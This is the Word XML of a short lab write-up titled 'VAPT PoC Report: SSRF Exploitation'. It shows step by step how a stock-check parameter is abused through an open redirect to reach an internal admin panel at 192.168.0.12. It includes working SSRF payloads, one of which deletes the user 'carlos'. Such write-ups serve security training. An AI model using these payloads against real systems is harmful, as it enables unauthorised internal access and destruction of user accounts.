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9D35" w14:textId="77777777" w:rsidR="008F2E17" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
      <w:r>
        <w:t>VAPT PoC Report: SSRF Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64A00A5A" w14:textId="3440BEDD" w:rsidR="00067841" w:rsidRPr="00067841" w:rsidRDefault="00000000" w:rsidP="00067841">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0010355D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Step </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="0010355D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>1:</w:t>
      </w:r>
      <w:r w:rsidR="00067841">
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00067841">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00067841" w:rsidRPr="00067841">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> Capture Stock Check Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AB9FB87" w14:textId="77777777" w:rsidR="00067841" w:rsidRPr="00067841" w:rsidRDefault="00067841" w:rsidP="00067841">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00067841">
        <w:t xml:space="preserve">Open any product </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7132FD25" w14:textId="77777777" w:rsidR="00067841" w:rsidRDefault="00067841" w:rsidP="00067841">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00067841">
        <w:t xml:space="preserve">Click </w:t>
      </w:r>
      <w:r w:rsidRPr="00067841">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>“Check stock”</w:t>
      </w:r>
      <w:r w:rsidRPr="00067841">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="448D6111" w14:textId="3A1C77F6" w:rsidR="00067841" w:rsidRPr="00067841" w:rsidRDefault="00067841" w:rsidP="00067841">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="12"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00067841">
        <w:t xml:space="preserve">Intercept in </w:t>
      </w:r>
      <w:r w:rsidRPr="00067841">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Burp Suite</w:t>
      </w:r>
      <w:r w:rsidRPr="00067841">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ED1A675" w14:textId="77777777" w:rsidR="00067841" w:rsidRPr="00067841" w:rsidRDefault="00067841" w:rsidP="00067841">
      <w:r w:rsidRPr="00067841">
        <w:t>Example:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BEBDC2D" w14:textId="76593D85" w:rsidR="00067841" w:rsidRPr="00067841" w:rsidRDefault="00067841" w:rsidP="00067841">
      <w:r w:rsidRPr="00067841">
        <w:t>POST /product/stock</w:t>
      </w:r>
      <w:r w:rsidRPr="00067841">
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00067841">
        <w:t>stockApi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00067841">
        <w:t>=/product/stock/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00067841">
        <w:t>check?productId</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00067841">
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:t>3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A7B4384" w14:textId="326A85FC" w:rsidR="00837120" w:rsidRDefault="00837120">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00837120">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="246DC73C" wp14:editId="1F8C4E94">
            <wp:extent cx="5486400" cy="2945765"/>
            <wp:effectExtent l="0" t="0" r="0" b="6985"/>
            <wp:docPr id="11030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5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32FE" w14:textId="77777777" w:rsidR="00067841" w:rsidRDefault="00067841">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36FD7C69" w14:textId="60BD34A5" w:rsidR="00067841" w:rsidRPr="00067841" w:rsidRDefault="00067841" w:rsidP="00067841">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00067841">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
        </w:rPr>
        <w:t>Step2 :-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00067841">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">Right-click → Send to Repeater </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="359A9F36" w14:textId="79F3798C" w:rsidR="00067841" w:rsidRPr="00067841" w:rsidRDefault="00067841" w:rsidP="00067841">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00067841">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> Test Direct SSRF (Fails)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07DAB702" w14:textId="77777777" w:rsidR="00067841" w:rsidRPr="00067841" w:rsidRDefault="00067841" w:rsidP="00067841">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00067841">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>Try changing:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CAB79C7" w14:textId="77777777" w:rsidR="00067841" w:rsidRPr="00067841" w:rsidRDefault="00067841" w:rsidP="00067841">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00067841">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>stockApi=http://192.168.0.12:8080/admin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E8329C1" w14:textId="77777777" w:rsidR="00067841" w:rsidRDefault="00067841">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="23608624" w14:textId="2D08E285" w:rsidR="0010355D" w:rsidRDefault="00067841" w:rsidP="0010355D">
      <w:r w:rsidRPr="00067841">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="48E6C349" wp14:editId="43CD0695">
            <wp:extent cx="5486400" cy="2938780"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="27372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0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6389" w14:textId="24C53E30" w:rsidR="00E85894" w:rsidRDefault="00000000" w:rsidP="00067841">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0010355D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Step 3</w:t>
      </w:r>
      <w:r w:rsidRPr="00E85894">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidR="0010355D" w:rsidRPr="00E85894">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:r w:rsidRPr="00E85894">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00E85894" w:rsidRPr="00E85894">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Craft payload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A68494F" w14:textId="4FBB7951" w:rsidR="009C0F6D" w:rsidRPr="009C0F6D" w:rsidRDefault="009C0F6D" w:rsidP="00067841">
      <w:r w:rsidRPr="009C0F6D">
        <w:t xml:space="preserve">Change the product item using the next product and capture the request </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009C0F6D">
        <w:t>stockAPI</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="47254410" w14:textId="66A4D940" w:rsidR="0010355D" w:rsidRDefault="00E85894" w:rsidP="00067841">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E85894">
        <w:t>stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin</w:t>
      </w:r>
      <w:r w:rsidR="00067841" w:rsidRPr="00067841">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6C3C74BA" wp14:editId="113CE36A">
            <wp:extent cx="5486400" cy="2818765"/>
            <wp:effectExtent l="0" t="0" r="0" b="635"/>
            <wp:docPr id="9568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2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D335" w14:textId="77777777" w:rsidR="00067841" w:rsidRDefault="00067841" w:rsidP="00067841">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E468394" w14:textId="77777777" w:rsidR="00067841" w:rsidRDefault="00067841" w:rsidP="00067841">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B1DF06D" w14:textId="00782773" w:rsidR="00067841" w:rsidRPr="0010355D" w:rsidRDefault="00E85894" w:rsidP="00067841">
      <w:r w:rsidRPr="00E85894">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Step4:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00E85894">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00E85894">
        <w:t xml:space="preserve">Account </w:t>
      </w:r>
      <w:r>
        <w:t>appear</w:t>
      </w:r>
      <w:r w:rsidRPr="00E85894">
        <w:t xml:space="preserve"> select the target account to delete </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CE9571D" w14:textId="77686C1D" w:rsidR="00C83673" w:rsidRDefault="00067841">
      <w:r w:rsidRPr="00067841">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7C0882E7" wp14:editId="3D1FD1B5">
            <wp:extent cx="5486400" cy="2962910"/>
            <wp:effectExtent l="0" t="0" r="0" b="8890"/>
            <wp:docPr id="145840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7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1EE" w14:textId="77777777" w:rsidR="00C83673" w:rsidRDefault="00C83673"/>
    <w:p w14:paraId="3F9064A6" w14:textId="77777777" w:rsidR="0010355D" w:rsidRDefault="0010355D">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E40BE94" w14:textId="77777777" w:rsidR="00067841" w:rsidRDefault="00067841">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="285EEC5B" w14:textId="77777777" w:rsidR="00067841" w:rsidRDefault="00067841"/>
    <w:p w14:paraId="77F53F6A" w14:textId="1CA0B853" w:rsidR="00440034" w:rsidRDefault="00440034">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00440034">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Step 8:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00440034">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00440034">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Delete Target User</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D4B0D7F" w14:textId="669195BF" w:rsidR="0010355D" w:rsidRPr="00440034" w:rsidRDefault="00440034">
      <w:r w:rsidRPr="00440034">
        <w:t>stockApi=</w:t>
      </w:r>
      <w:r w:rsidR="00067841" w:rsidRPr="00067841">
        <w:t>/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos</w:t>
      </w:r>
      <w:r w:rsidR="00067841">
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54DAB76A" w14:textId="1565A968" w:rsidR="00440034" w:rsidRDefault="00067841">
      <w:r w:rsidRPr="00067841">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7820AEC7" wp14:editId="4489E4A7">
            <wp:extent cx="5486400" cy="2945765"/>
            <wp:effectExtent l="0" t="0" r="0" b="6985"/>
            <wp:docPr id="3217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8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2C6" w14:textId="77777777" w:rsidR="00067841" w:rsidRDefault="00067841"/>
    <w:p w14:paraId="14375914" w14:textId="77777777" w:rsidR="00067841" w:rsidRDefault="00067841"/>
    <w:p w14:paraId="54E755E2" w14:textId="68E78071" w:rsidR="0010355D" w:rsidRDefault="00440034">
      <w:r>
        <w:t xml:space="preserve">Step 9: - Lab solve successfully </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57A452C9" w14:textId="7FD1691A" w:rsidR="008F2E17" w:rsidRDefault="00067841">
      <w:r w:rsidRPr="00067841">
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1FBA01F5" wp14:editId="77883EE7">
            <wp:extent cx="5486400" cy="2922905"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="64998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88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E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58B6A" w14:textId="77777777" w:rsidR="00FA5A16" w:rsidRDefault="00FA5A16" w:rsidP="0010355D">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="7020262C" w14:textId="77777777" w:rsidR="00FA5A16" w:rsidRDefault="00FA5A16" w:rsidP="00103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1C57A" w14:textId="77777777" w:rsidR="00FA5A16" w:rsidRDefault="00FA5A16" w:rsidP="0010355D">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="0BD68B7B" w14:textId="77777777" w:rsidR="00FA5A16" w:rsidRDefault="00FA5A16" w:rsidP="00103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F6D50"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A78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57AF5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A43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01024"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="DA0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F2106"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="122A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017571">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="474685936">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1103263736">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="477037468">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1038311159">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1464889979">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="88161468">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="375664876">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="56562645">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="82533226">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="1834684049">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="802965147">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="1651594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41"/>
    <w:rsid w:val="0010355D"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="00376DCB"/>
    <w:rsid w:val="00440034"/>
    <w:rsid w:val="00756751"/>
    <w:rsid w:val="00837120"/>
    <w:rsid w:val="008F2E17"/>
    <w:rsid w:val="009C0F6D"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00C83673"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00D551E5"/>
    <w:rsid w:val="00DD2AB5"/>
    <w:rsid w:val="00DF183C"/>
    <w:rsid w:val="00E85894"/>
    <w:rsid w:val="00FA5A16"/>
    <w:rsid w:val="00FB33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0DA94"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{05D21CD0-A0B9-449A-AEA5-7FEFE945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3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7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355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355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19</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-30T06:59:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>